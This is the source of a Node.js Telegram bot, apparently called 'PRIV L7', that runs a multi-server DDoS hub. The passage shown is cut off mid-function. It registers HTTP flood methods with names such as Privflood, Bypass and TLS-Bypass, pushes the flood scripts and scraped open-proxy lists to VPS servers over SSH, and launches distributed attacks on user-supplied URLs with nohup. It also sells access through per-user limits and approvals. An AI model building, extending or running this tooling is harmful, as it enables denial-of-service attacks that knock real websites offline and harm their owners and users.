/**
 * PRIV L7 — Multi-Server Telegram Bot Hub
 * 
 * Features:
 *  - Full Telegram-only control (no domain, no mini app)
 *  - Add/remove custom attack methods (upload .js + register)
 *  - Add/remove VPS servers via SSH (ip:port, user, pass)
 *  - Attack distributed across local + all online servers
 *  - Live server status (ssh check), sync files, kill remote PIDs
 *  - Per-user limits, cooldowns, blacklist, audit log
 * 
 * Install: npm install ssh2 node-telegram-bot-api axios bcryptjs colors hpack node-bash-title
 * Run:     BOT_TOKEN=xxx ADMIN_ID=123 node bot.js
 */

'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');
const TelegramBot = require('node-telegram-bot-api');
const { Client } = require('ssh2');
const axios = require('axios');

/* ══════════════════════════ CONFIG ══════════════════════════ */

const CONFIG = {
  BOT_TOKEN: process.env.BOT_TOKEN || '',
  ADMIN_IDS: (process.env.ADMIN_ID || '').split(',').filter(Boolean).map(Number),
  SCRIPT_DIR: __dirname,
  DATA_DIR: path.join(__dirname, 'data'),
  DEFAULT_COOLDOWN: Number(process.env.COOLDOWN || 30),
  MAX_CONCURRENT: Number(process.env.MAX_CONCURRENT || 3),
  PROXY_FILE: 'proxy.txt',
  REMOTE_DIR: '/root/attack',
  SSH_TIMEOUT: 20000,
};

if (!CONFIG.BOT_TOKEN) {
  console.error('BOT_TOKEN required. Example: BOT_TOKEN=123:abc ADMIN_ID=987 node bot.js');
  process.exit(1);
}
if (CONFIG.ADMIN_IDS.length === 0) {
  console.error('ADMIN_ID required (your numeric telegram id).');
  process.exit(1);
}

fs.mkdirSync(CONFIG.DATA_DIR, { recursive: true });

const USERS_FILE = path.join(CONFIG.DATA_DIR, 'users.json');
const SERVERS_FILE = path.join(CONFIG.DATA_DIR, 'servers.json');
const METHODS_FILE = path.join(CONFIG.DATA_DIR, 'methods.json');
const BLACKLIST_FILE = path.join(CONFIG.DATA_DIR, 'blacklist.json');
const AUDIT_FILE = path.join(CONFIG.DATA_DIR, 'audit.log');
const SESSIONS_FILE = path.join(CONFIG.DATA_DIR, 'sessions.json');

for (const [f, init] of [
  [USERS_FILE, '{}'],
  [SERVERS_FILE, '[]'],
  [METHODS_FILE, '[]'],
  [BLACKLIST_FILE, '[]'],
  [SESSIONS_FILE, '[]'],
]) {
  if (!fs.existsSync(f)) fs.writeFileSync(f, init + '\n');
}

/* ══════════════════════════ STATE ══════════════════════════ */

const sessions = new Map();           // id -> session
const cooldowns = new Map();          // telegramId -> { until }
const pendingInput = new Map();       // telegramId -> { action, data, expires }
const lastUploadedFile = new Map();   // telegramId -> filename
const serverConns = new Map();        // serverId -> ssh2 Client (pool)
const serverBusy = new Map();         // serverId -> bool (install in progress)

/* ══════════════════════════ STORAGE ══════════════════════════ */

function readJSON(file, fallback) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); }
  catch { return fallback; }
}

function writeJSON(file, data) {
  const tmp = file + '.tmp';
  fs.writeFileSync(tmp, JSON.stringify(data, null, 2) + '\n', { mode: 0o600 });
  fs.renameSync(tmp, file);
}

function audit(event, actor, details = {}) {
  try {
    fs.appendFileSync(AUDIT_FILE, JSON.stringify({ at: new Date().toISOString(), event, actor, details }) + '\n');
  } catch {}
}

/* ══════════════════════════ USERS ══════════════════════════ */

function loadUsers() { return readJSON(USERS_FILE, {}); }
function saveUsers(u) { writeJSON(USERS_FILE, u); }
function getUser(id) { return loadUsers()[String(id)] || null; }

function upsertUser(id, patch) {
  const users = loadUsers();
  const key = String(id);
  users[key] = { ...(users[key] || {}), ...patch, updatedAt: new Date().toISOString() };
  saveUsers(users);
  return users[key];
}

function isAdmin(id) { return CONFIG.ADMIN_IDS.includes(id); }

function ensureUserExists(msg) {
  const id = msg.from.id;
  const existing = getUser(id);
  if (existing) return existing;

  if (isAdmin(id)) {
    return upsertUser(id, {
      telegramId: id,
      username: msg.from.username || null,
      firstName: msg.from.first_name || null,
      role: 'admin',
      createdAt: new Date().toISOString(),
      limits: { maxDuration: 0, maxThreads: 0, maxRate: 0, maxConcurrent: 0, cooldown: 0 },
    });
  }

  return upsertUser(id, {
    telegramId: id,
    username: msg.from.username || null,
    firstName: msg.from.first_name || null,
    role: 'pending',
    createdAt: new Date().toISOString(),
    limits: { maxDuration: 300, maxThreads: 16, maxRate: 90, maxConcurrent: 1, cooldown: CONFIG.DEFAULT_COOLDOWN },
  });
}

/* ══════════════════════════ BLACKLIST ══════════════════════════ */

function loadBlacklist() { return readJSON(BLACKLIST_FILE, []); }
function saveBlacklist(l) { writeJSON(BLACKLIST_FILE, l); }

function normalizeHost(raw) {
  return String(raw || '').toLowerCase()
    .replace(/^[a-z]+:\/\//, '')
    .replace(/[/?#].*$/, '')
    .replace(/:\d+$/, '')
    .replace(/\.+$/, '');
}

function hostMatches(host, pattern) {
  host = normalizeHost(host); pattern = normalizeHost(pattern);
  if (!host || !pattern) return false;
  if (pattern.startsWith('*.')) {
    const base = pattern.slice(2);
    return host === base || host.endsWith('.' + base);
  }
  return host === pattern;
}

function isBlacklisted(host) {
  return loadBlacklist().some(p => hostMatches(host, p));
}

/* ══════════════════════════ METHODS ══════════════════════════ */

const BUILTIN_METHODS = [
  {
    id: 'priv', name: 'Privflood', file: 'priv.js', builtin: true,
    example: 'priv <url> <dur> <threads> <rate> [cookies] [headers] [ddg]',
    parse: (a) => {
      const [target, duration, threads, rate, ...f] = a;
      const b = [target, duration, CONFIG.PROXY_FILE, threads, rate];
      if (f.includes('cookies')) b.push('-c');
      if (f.includes('headers')) b.push('-h');
      if (f.includes('ddg')) b.push('-ddg');
      return { target, duration, threads, rate, args: b };
    },
  },
  {
    id: 'bypass', name: 'Bypass', file: 'bypass.js', builtin: true,
    example: 'bypass <GET|POST> <url> <dur> <threads> <rate> [query=0|1|2|3] [limit] [delay=ms] [ios]',
    parse: (a) => {
      const [method, target, duration, threads, rate, ...o] = a;
      const b = [method.toUpperCase(), target, duration, threads, rate, CONFIG.PROXY_FILE];
      o.forEach(x => {
        if (x.startsWith('query=')) b.push('--query', x.split('=')[1]);
        else if (x === 'limit') b.push('--limit', 'true');
        else if (x.startsWith('delay=')) b.push('--delay', x.split('=')[1]);
        else if (x === 'ios') b.push('--ios');
        else if (x === 'debug') b.push('--debug');
      });
      return { target, duration, threads, rate, args: b };
    },
  },
  {
    id: 'crush', name: 'C-Rush', file: 'l.js', builtin: true,
    example: 'crush <url> <dur> <threads> <rate> [cookies] [headers] [cache]',
    parse: (a) => {
      const [target, duration, threads, rate, ...f] = a;
      const b = [target, duration, CONFIG.PROXY_FILE, threads, rate];
      if (f.includes('cookies')) b.push('-c');
      if (f.includes('headers')) b.push('-h');
      if (f.includes('cache')) b.push('-ch', 'true');
      return { target, duration, threads, rate, args: b };
    },
  },
  {
    id: 'tls', name: 'TLS-Bypass', file: 'tls.js', builtin: true,
    example: 'tls <url> <dur> <rate> <threads>',
    parse: (a) => {
      const [target, duration, rate, threads] = a;
      return { target, duration, threads, rate, args: [target, duration, rate, threads, CONFIG.PROXY_FILE] };
    },
  },
];

function loadCustomMethods() { return readJSON(METHODS_FILE, []); }
function saveCustomMethods(l) { writeJSON(METHODS_FILE, l); }

function allMethods() {
  const custom = loadCustomMethods().map(m => ({
    id: m.id, name: m.name, file: m.file, builtin: false,
    template: m.template,
    example: m.example || `${m.id} <args...>`,
    parse: (a) => {
      let s = m.template;
      a.forEach((v, i) => { s = s.replace(new RegExp(`\\$${i + 1}`, 'g'), v); });
      s = s.replace(/\{proxy\}/g, CONFIG.PROXY_FILE);
      const arr = s.split(/\s+/).filter(Boolean);
      return { target: a[0], duration: a[1], threads: a[2], rate: a[3], args: arr };
    },
  }));
  return [...BUILTIN_METHODS, ...custom];
}

function getMethod(id) { return allMethods().find(m => m.id === id); }

function availableMethods() {
  return allMethods().filter(m => fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file)));
}

/* ══════════════════════════ SERVERS ══════════════════════════ */

function loadServers() { return readJSON(SERVERS_FILE, []); }
function saveServers(l) { writeJSON(SERVERS_FILE, l); }

function getServer(id) { return loadServers().find(s => s.id === id); }

function upsertServer(patch) {
  const list = loadServers();
  const idx = list.findIndex(s => s.id === patch.id);
  if (idx >= 0) list[idx] = { ...list[idx], ...patch };
  else list.push(patch);
  saveServers(list);
  return patch;
}

function removeServer(id) {
  const conn = serverConns.get(id);
  if (conn) { try { conn.end(); } catch {} serverConns.delete(id); }
  saveServers(loadServers().filter(s => s.id !== id));
}

function newServerId() { return 'srv_' + crypto.randomBytes(3).toString('hex'); }

/* ══════════════════════════ SSH LAYER ══════════════════════════ */

function sshConnect(server) {
  return new Promise((resolve, reject) => {
    const conn = new Client();
    const timer = setTimeout(() => {
      try { conn.end(); } catch {}
      reject(new Error('SSH timeout'));
    }, CONFIG.SSH_TIMEOUT);

    conn.once('ready', () => {
      clearTimeout(timer);
      resolve(conn);
    });
    conn.once('error', (e) => {
      clearTimeout(timer);
      reject(e);
    });
    try {
      conn.connect({
        host: server.host,
        port: server.port,
        username: server.username,
        password: server.password,
        readyTimeout: CONFIG.SSH_TIMEOUT,
        algorithms: {
          serverHostKey: ['ssh-rsa', 'ecdsa-sha2-nistp256', 'ssh-ed25519'],
        },
      });
    } catch (e) {
      clearTimeout(timer);
      reject(e);
    }
  });
}

function sshExec(conn, cmd, timeoutMs = 120000) {
  return new Promise((resolve) => {
    let done = false;
    const timer = setTimeout(() => {
      if (!done) { done = true; resolve({ code: -1, out: '', err: 'exec timeout' }); }
    }, timeoutMs);

    try {
      conn.exec(cmd, (err, stream) => {
        if (err) {
          clearTimeout(timer);
          done = true;
          return resolve({ code: -1, out: '', err: err.message });
        }
        let out = '', errOut = '';
        stream.on('data', d => { out += d.toString(); });
        stream.stderr.on('data', d => { errOut += d.toString(); });
        stream.on('close', (code) => {
          clearTimeout(timer);
          done = true;
          resolve({ code: code || 0, out, err: errOut });
        });
      });
    } catch (e) {
      clearTimeout(timer);
      done = true;
      resolve({ code: -1, out: '', err: e.message });
    }
  });
}

function sshUpload(conn, localPath, remotePath) {
  return new Promise((resolve, reject) => {
    conn.sftp((err, sftp) => {
      if (err) return reject(err);
      sftp.fastPut(localPath, remotePath, (err2) => {
        try { sftp.end(); } catch {}
        if (err2) reject(err2);
        else resolve();
      });
    });
  });
}

async function getServerConn(serverId) {
  if (serverConns.has(serverId)) {
    const c = serverConns.get(serverId);
    if (c._ready) return c;
    serverConns.delete(serverId);
  }
  const server = getServer(serverId);
  if (!server) throw new Error('Server not found: ' + serverId);
  const conn = await sshConnect(server);
  conn._ready = true;
  conn.on('close', () => { serverConns.delete(serverId); });
  conn.on('error', () => { serverConns.delete(serverId); });
  serverConns.set(serverId, conn);
  return conn;
}

async function checkServerHealth(serverId) {
  try {
    const conn = await getServerConn(serverId);
    const r = await sshExec(conn, 'echo ok; uptime', 10000);
    const online = r.out.includes('ok');
    upsertServer({
      id: serverId,
      status: online ? 'online' : 'offline',
      lastCheck: Date.now(),
    });
    return {
      online,
      load: (r.out.match(/load average: ([^\n]+)/) || [])[1] || '?',
      raw: r.out,
    };
  } catch (e) {
    upsertServer({ id: serverId, status: 'offline', lastCheck: Date.now() });
    return { online: false, load: '?', error: e.message };
  }
}

/* ══════════════════════════ REMOTE SETUP ══════════════════════════ */

async function setupRemote(server, onProgress) {
  const conn = await sshConnect(server);

  try {
    onProgress && await onProgress('checking node...');
    const nodeCheck = await sshExec(conn, 'command -v node && node -v', 15000);

    if (nodeCheck.code !== 0 || !nodeCheck.out.trim()) {
      onProgress && await onProgress('installing node.js 20...');
      const install = await sshExec(
        conn,
        'export DEBIAN_FRONTEND=noninteractive; ' +
        'curl -fsSL https://deb.nodesource.com/setup_20.x | bash - 2>&1 | tail -2; ' +
        'apt install -y nodejs build-essential 2>&1 | tail -3',
        180000
      );
      if (install.code !== 0 && !install.out.includes('already')) {
        throw new Error('node install failed: ' + install.err.slice(0, 200));
      }
    } else {
      onProgress && await onProgress('node already installed: ' + nodeCheck.out.trim());
    }

    onProgress && await onProgress('creating remote folder...');
    await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 10000);

    onProgress && await onProgress('uploading attack scripts...');
    const files = ['priv.js', 'bypass.js', 'l.js', 'tls.js'];
    for (const f of files) {
      const local = path.join(CONFIG.SCRIPT_DIR, f);
      if (!fs.existsSync(local)) continue;
      await sshUpload(conn, local, `${CONFIG.REMOTE_DIR}/${f}`);
    }

    const proxyLocal = path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE);
    if (fs.existsSync(proxyLocal)) {
      onProgress && await onProgress('uploading proxy list...');
      await sshUpload(conn, proxyLocal, `${CONFIG.REMOTE_DIR}/${CONFIG.PROXY_FILE}`);
    }

    onProgress && await onProgress('installing npm deps (may take 1-2 min)...');
    const npmInstall = await sshExec(
      conn,
      `cd ${CONFIG.REMOTE_DIR} && npm init -y > /dev/null 2>&1; npm install colors hpack node-bash-title axios --silent --no-audit --no-fund 2>&1 | tail -3`,
      240000
    );
    if (npmInstall.code !== 0) {
      throw new Error('npm install failed: ' + npmInstall.err.slice(0, 300));
    }

    onProgress && await onProgress('done ✓');
    return { ok: true };
  } finally {
    try { conn.end(); } catch {}
  }
}

/* ══════════════════════════ ATTACK ENGINE ══════════════════════════ */

function newSessionId() { return 'sess_' + crypto.randomBytes(3).toString('hex'); }

function userActiveSessions(id) {
  return [...sessions.values()].filter(s => s.owner === id && s.status === 'running').length;
}

function launchLocal(user, method, args) {
  const id = newSessionId();
  const methodPath = path.join(CONFIG.SCRIPT_DIR, method.file);
  if (!fs.existsSync(methodPath)) throw new Error(`File missing: ${method.file}`);

  const child = spawn(process.execPath, [methodPath, ...args], {
    cwd: CONFIG.SCRIPT_DIR,
    detached: true,
    stdio: ['ignore', 'pipe', 'pipe'],
    env: { PATH: process.env.PATH || '', NODE_ENV: 'production' },
  });

  const session = {
    id, owner: user.telegramId, method: method.id, methodName: method.name,
    target: args[0] || '?', duration: Number(args[1]) || 0,
    startedAt: Date.now(), status: 'running', where: 'local',
    child, logs: '',
  };

  child.stdout.on('data', d => { session.logs = (session.logs + d.toString()).slice(-3000); });
  child.stderr.on('data', d => { session.logs = (session.logs + d.toString()).slice(-3000); });
  child.on('exit', () => {
    session.status = 'done';
    setTimeout(() => sessions.delete(id), 30000);
  });

  session.timer = setTimeout(() => stopSession(id, 'duration_expired'), session.duration * 1000);
  session.timer.unref();

  sessions.set(id, session);
  return session;
}

async function launchRemote(user, method, args, serverId) {
  const server = getServer(serverId);
  if (!server) throw new Error('Server not found: ' + serverId);

  const conn = await getServerConn(serverId);

  const check = await sshExec(conn, `[ -f ${CONFIG.REMOTE_DIR}/${method.file} ] && echo ok`, 8000);
  if (!check.out.includes('ok')) {
    throw new Error(`Method file not on server ${server.name}. Run /sync ${serverId}`);
  }

  const id = newSessionId();
  const cmd = `cd ${CONFIG.REMOTE_DIR} && nohup node ${method.file} ${args.join(' ')} > /dev/null 2>&1 & echo $!`;
  const r = await sshExec(conn, cmd, 15000);
  const remotePid = parseInt(r.out.trim().split(/\s+/).pop(), 10);

  if (!remotePid || isNaN(remotePid)) {
    throw new Error('Failed to get remote PID. Output: ' + r.out.slice(0, 100));
  }

  const session = {
    id, owner: user.telegramId, method: method.id, methodName: method.name,
    target: args[0] || '?', duration: Number(args[1]) || 0,
    startedAt: Date.now(), status: 'running', where: 'remote',
    serverId, serverName: server.name, remotePid, logs: '',
  };

  session.timer = setTimeout(() => stopSession(id, 'duration_expired'), session.duration * 1000);
  session.timer.unref();

  sessions.set(id, session);
  return session;
}

function stopSession(id, reason = 'manual') {
  const s = sessions.get(id);
  if (!s || s.status !== 'running') return false;

  if (s.where === 'local' && s.child) {
    try { process.kill(-s.child.pid, 'SIGKILL'); }
    catch { try { s.child.kill('SIGKILL'); } catch {} }
  } else if (s.where === 'remote' && s.remotePid) {
    (async () => {
      try {
        const conn = await getServerConn(s.serverId);
        await sshExec(conn, `kill -9 ${s.remotePid} 2>/dev/null || true`, 8000);
      } catch {}
    })();
  }

  clearTimeout(s.timer);
  s.status = 'stopped';
  audit('attack_stopped', s.owner, { id, reason });
  return true;
}

/* ══════════════════════════ VALIDATION ══════════════════════════ */

function validateTarget(raw) {
  let url;
  try { url = new URL(raw); } catch { throw new Error('URL invalid. Example: https://target.com'); }
  if (url.protocol !== 'https:') throw new Error('Must be https://');
  return { url: raw, host: normalizeHost(url.hostname) };
}

function checkLimits(user, duration, threads, rate) {
  const l = user.limits || {};
  if (l.maxDuration > 0 && Number(duration) > l.maxDuration) throw new Error(`Duration max ${l.maxDuration}s`);
  if (l.maxThreads > 0 && Number(threads) > l.maxThreads) throw new Error(`Threads max ${l.maxThreads}`);
  if (l.maxRate > 0 && Number(rate) > l.maxRate) throw new Error(`Rate max ${l.maxRate}`);
}

/* ══════════════════════════ PROXY SCRAPE ══════════════════════════ */

const PROXY_SOURCES = [
  'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
  'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
  'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
  'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
  'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
  'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
  'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
  'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
  'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
  'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
];

async function scrapeProxies() {
  const seen = new Set();
  for (const src of PROXY_SOURCES) {
    try {
      const r = await axios.get(src, { timeout: 12000 });
      r.data.toString().split(/\r?\n/).forEach(l => {
        const t = l.trim();
        if (/^\d{1,3}(\.\d{1,3}){3}:\d{1,5}$/.test(t)) seen.add(t);
      });
    } catch {}
  }
  const list = [...seen];
  fs.writeFileSync(path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE), list.join('\n'));
  return list.length;
}

/* ══════════════════════════ BOT ══════════════════════════ */

const bot = new TelegramBot(CONFIG.BOT_TOKEN, { polling: true });

function esc(s) {
  return String(s || '').replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

async function reply(msg, text, opts = {}) {
  try { return await bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown', ...opts }); }
  catch { try { return await bot.sendMessage(msg.chat.id, text); } catch {} }
}

async function editMsg(chatId, messageId, text) {
  try { await bot.editMessageText(text, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }); }
  catch {}
}

/* ══════════════════════════ COMMANDS REGISTRY ══════════════════════════ */

const COMMANDS = new Map();
function cmd(name, handler) { COMMANDS.set(name, handler); }

function adminOnly(msg) {
  if (!isAdmin(msg.from.id)) { reply(msg, '🚫 Admin only.'); return false; }
  return true;
}

/* ───── /start ───── */

cmd('start', async (msg) => {
  const user = ensureUserExists(msg);
  const txt = [
    `🔥 *PRIV L7 MULTI-SERVER HUB* 🔥`,
    ``,
    `User: *${esc(msg.from.first_name || 'anon')}*`,
    `ID: \`${msg.from.id}\``,
    `Role: *${esc(user.role)}*`,
    ``,
    `*User commands:*`,
    `/help — full command list`,
    `/me — account & limits`,
    `/methods — list attack methods`,
    `/servers — list attack servers`,
    `/status — active sessions`,
    `/stop <id> — stop a session`,
    `/scrape — scrape proxies`,
  ];
  if (isAdmin(msg.from.id)) {
    txt.push('', '*Admin:*');
    txt.push('/users /approve /ban /adduser /setlimit');
    txt.push('/blacklist /black /unblack /stats');
    txt.push('*Methods:* /addmethod /delmethod /uploadmethod');
    txt.push('*Servers:* /addserver /delserver /servercheck /sync /syncall');
  }
  await reply(msg, txt.join('\n'));
});

/* ───── /help ───── */

cmd('help', async (msg) => {
  ensureUserExists(msg);
  const m = availableMethods().map(x => `• \`${x.id}\` — ${x.name}\n  ${esc(x.example)}`).join('\n');
  const txt = [
    '*Available methods:*',
    m || '_none_',
    '',
    '*Attack patterns:*',
    '`/attack <method> <args...>` — local only',
    '`/attack <method> <args...> @all` — local + all online servers',
    '`/attack <method> <args...> @srv_xxx` — one server',
    '`/attack <method> <args...> @srv_xxx,srv_yyy` — multiple servers',
    '',
    '*All commands:*',
    '/start /help /me /methods /servers /status /stop /scrape /attack',
  ];
  if (isAdmin(msg.from.id)) {
    txt.push('', '*Admin:*');
    txt.push('/users /approve /ban /adduser /setlimit /stats');
    txt.push('/blacklist /black /unblack');
    txt.push('/addmethod /delmethod /uploadmethod');
    txt.push('/addserver /delserver /servercheck /sync /syncall');
  }
  await reply(msg, txt.join('\n'));
});

/* ───── /me ───── */

cmd('me', async (msg) => {
  const user = ensureUserExists(msg);
  const l = user.limits || {};
  const cd = cooldowns.get(msg.from.id);
  const cdLeft = cd && cd.until > Date.now() ? Math.ceil((cd.until - Date.now()) / 1000) : 0;

  await reply(msg, [
    `*Account Info*`,
    `ID: \`${user.telegramId}\``,
    `Role: *${user.role}*`,
    `Since: ${new Date(user.createdAt).toLocaleDateString()}`,
    ``,
    `*Limits:*`,
    `Duration: ${l.maxDuration || '∞'}`,
    `Threads: ${l.maxThreads || '∞'}`,
    `Rate: ${l.maxRate || '∞'}`,
    `Concurrent: ${l.maxConcurrent || '∞'}`,
    `Cooldown: ${l.cooldown || 0}s`,
    cdLeft > 0 ? `\n⏳ Cooldown: *${cdLeft}s*` : '',
  ].join('\n'));
});

/* ───── /methods ───── */

cmd('methods', async (msg) => {
  const list = allMethods();
  const txt = ['*Attack methods:*', ''];
  list.forEach(m => {
    const exists = fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file));
    const tag = m.builtin ? '📦' : '🔧';
    const st = exists ? '✅' : '❌ file missing';
    txt.push(`${tag} *${m.name}* (\`${m.id}\`) ${st}`);
    txt.push(`  \`${m.example}\``);
    txt.push('');
  });
  await reply(msg, txt.join('\n'));
});

/* ───── /addmethod ───── */

cmd('addmethod', async (msg, args) => {
  if (!adminOnly(msg)) return;

  if (args.length < 4) {
    return reply(msg, [
      '*Add a custom method*',
      '',
      'Format:',
      '`/addmethod <id> <name> <filename.js> <template>`',
      '',
      'Template use `$1 $2 $3 $4...` for positional args and `{proxy}` for proxy path.',
      '',
      'Example:',
      '`/addmethod myatk "My Attack" myatk.js "$1 $2 $3 $4 -c -h"`',
      '',
      'Upload the .js file first via `/uploadmethod` or scp to the bot folder.',
    ].join('\n'));
  }

  const [id, name, file, ...templateParts] = args;
  const template = templateParts.join(' ');

  if (!/^[a-zA-Z0-9_-]{2,20}$/.test(id)) {
    return reply(msg, '❌ ID must be 2-20 chars, letters/numbers/_/- only');
  }
  if (allMethods().some(m => m.id === id)) {
    return reply(msg, '❌ Method ID already exists.');
  }
  if (!fs.existsSync(path.join(CONFIG.SCRIPT_DIR, file))) {
    return reply(msg, `❌ File \`${file}\` not found. Upload via /uploadmethod first.`);
  }

  const list = loadCustomMethods();
  list.push({
    id, name, file, template,
    example: `${id} <args...>`,
    addedBy: msg.from.id,
    addedAt: new Date().toISOString(),
  });
  saveCustomMethods(list);
  audit('method_added', msg.from.id, { id, file, template });

  await reply(msg, [
    `✅ Method added:`,
    `ID: \`${id}\``,
    `Name: *${name}*`,
    `File: \`${file}\``,
    `Template: \`${template}\``,
    '',
    `Try: \`/attack ${id} <args...>\``,
  ].join('\n'));
});

/* ───── /delmethod ───── */

cmd('delmethod', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const id = args[0];
  if (!id) return reply(msg, 'Usage: `/delmethod <id>`');

  if (BUILTIN_METHODS.some(m => m.id === id)) {
    return reply(msg, '❌ Cannot delete built-in methods.');
  }

  const list = loadCustomMethods();
  const idx = list.findIndex(m => m.id === id);
  if (idx < 0) return reply(msg, '❌ Method not found.');

  list.splice(idx, 1);
  saveCustomMethods(list);
  audit('method_deleted', msg.from.id, { id });
  await reply(msg, `✅ Deleted method \`${id}\``);
});

/* ───── /uploadmethod ───── */

cmd('uploadmethod', async (msg) => {
  if (!adminOnly(msg)) return;
  await reply(msg, '📎 Send the `.js` file as a document. I will save it to the bot scripts folder.');
  pendingInput.set(msg.from.id, { action: 'await_method_file', expires: Date.now() + 300000 });
});

/* ───── /addserver ───── */

cmd('addserver', async (msg, args) => {
  if (!adminOnly(msg)) return;

  // Quick mode: /addserver ip:port user pass [name]
  if (args.length >= 3) {
    const [addr, username, ...rest] = args;
    const password = rest[0];
    const name = rest.slice(1).join(' ') || addr;
    return addServerFlow(msg, addr, username, password, name);
  }

  // Interactive
  pendingInput.set(msg.from.id, { action: 'addserver_addr', data: {}, expires: Date.now() + 300000 });
  await reply(msg, [
    '🔌 *Add Server*',
    '',
    'Send IP:PORT',
    'Example: `77.237.244.35:22`',
    '',
    '_Cancel with /cancel_',
  ].join('\n'));
});

async function addServerFlow(msg, addr, username, password, name) {
  const m = String(addr).match(/^([\d.]+|[\w.-]+):(\d+)$/);
  if (!m) return reply(msg, '❌ Format: `ip:port`');

  const [, host, portStr] = m;
  const port = parseInt(portStr, 10);
  if (!port || port < 1 || port > 65535) return reply(msg, '❌ Invalid port.');

  const id = newServerId();

  const statusMsg = await reply(msg, '🔄 Testing SSH connection...');

  const server = {
    id, host, port, username, password, name,
    status: 'testing', addedBy: msg.from.id, addedAt: new Date().toISOString(), lastCheck: 0,
  };

  try {
    await sshConnect(server);
  } catch (e) {
    await editMsg(msg.chat.id, statusMsg.message_id, `❌ SSH failed: \`${e.message.slice(0, 150)}\``);
    return;
  }

  // Save now (with status=setting_up)
  server.status = 'setting_up';
  upsertServer(server);

  await editMsg(msg.chat.id, statusMsg.message_id, '✅ SSH OK. Setting up remote server...');

  try {
    await setupRemote(server, async (p) => {
      await editMsg(msg.chat.id, statusMsg.message_id, `⚙️ ${p}`);
    });

    upsertServer({ id, status: 'online', lastCheck: Date.now() });
    audit('server_added', msg.from.id, { id, host, port, username });

    await editMsg(
      msg.chat.id,
      statusMsg.message_id,
      `✅ *Server added* \`${id}\`\nName: *${esc(name)}*\n${esc(host)}:${port}\nStatus: *online*\n\nUse \`/attack <method> <args...> @${id}\``
    );
  } catch (e) {
    upsertServer({ id, status: 'error', lastCheck: Date.now() });
    await editMsg(msg.chat.id, statusMsg.message_id, `❌ Setup failed: \`${e.message.slice(0, 200)}\``);
  }
}

/* ───── /servers ───── */

cmd('servers', async (msg) => {
  ensureUserExists(msg);
  const list = loadServers();
  if (list.length === 0) return reply(msg, '📭 No servers configured.');

  const txt = [`*Servers (${list.length}):*`, ''];
  list.forEach(s => {
    const icon = s.status === 'online' ? '🟢' : s.status === 'offline' ? '🔴' : '⚪';
    const last = s.lastCheck ? new Date(s.lastCheck).toLocaleTimeString() : 'never';
    txt.push(`${icon} \`${s.id}\` — *${esc(s.name)}*`);
    txt.push(`  ${esc(s.host)}:${s.port} · user=${esc(s.username)}`);
    txt.push(`  status=${s.status} · checked ${last}`);
    txt.push('');
  });
  await reply(msg, txt.join('\n'));
});

/* ───── /delserver ───── */

cmd('delserver', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const id = args[0];
  if (!id) return reply(msg, 'Usage: `/delserver <server_id>`');
  if (!getServer(id)) return reply(msg, '❌ Server not found.');

  removeServer(id);
  audit('server_removed', msg.from.id, { id });
  await reply(msg, `✅ Removed server \`${id}\``);
});

/* ───── /servercheck ───── */

cmd('servercheck', async (msg, args) => {
  ensureUserExists(msg);
  const id = args[0];
  if (!id) return reply(msg, 'Usage: `/servercheck <server_id>`');
  if (!getServer(id)) return reply(msg, '❌ Server not found.');

  await reply(msg, `🔄 Checking \`${id}\`...`);
  const r = await checkServerHealth(id);
  if (r.online) {
    await reply(msg, `🟢 \`${id}\` online\nLoad: \`${esc(r.load)}\``);
  } else {
    await reply(msg, `🔴 \`${id}\` offline\nReason: \`${esc(r.error || 'unknown')}\``);
  }
});

/* ───── /sync ───── */

cmd('sync', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const id = args[0];
  if (!id) return reply(msg, 'Usage: `/sync <server_id>` — push latest files & proxy');
  const server = getServer(id);
  if (!server) return reply(msg, '❌ Server not found.');

  const statusMsg = await reply(msg, `🔄 Syncing \`${id}\`...`);

  try {
    const conn = await getServerConn(id);
    await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 10000);

    for (const f of ['priv.js', 'bypass.js', 'l.js', 'tls.js']) {
      const local = path.join(CONFIG.SCRIPT_DIR, f);
      if (fs.existsSync(local)) await sshUpload(conn, local, `${CONFIG.REMOTE_DIR}/${f}`);
    }

    const proxyLocal = path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE);
    if (fs.existsSync(proxyLocal)) {
      await sshUpload(conn, proxyLocal, `${CONFIG.REMOTE_DIR}/${CONFIG.PROXY_FILE}`);
    }

    upsertServer({ id, status: 'online', lastCheck: Date.now() });
    await editMsg(msg.chat.id, statusMsg.message_id, `✅ Synced \`${id}\``);
  } catch (e) {
    await editMsg(msg.chat.id, statusMsg.message_id, `❌ Sync failed: \`${e.message.slice(0, 150)}\``);
  }
});

/* ───── /syncall ───── */

cmd('syncall', async (msg) => {
  if (!adminOnly(msg)) return;
  const servers = loadServers();
  if (servers.length === 0) return reply(msg, '📭 No servers.');

  const statusMsg = await reply(msg, `🔄 Syncing ${servers.length} servers...`);
  let ok = 0, fail = 0;

  for (const s of servers) {
    try {
      const conn = await getServerConn(s.id);
      await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 10000);
      for (const f of ['priv.js', 'bypass.js', 'l.js', 'tls.js']) {
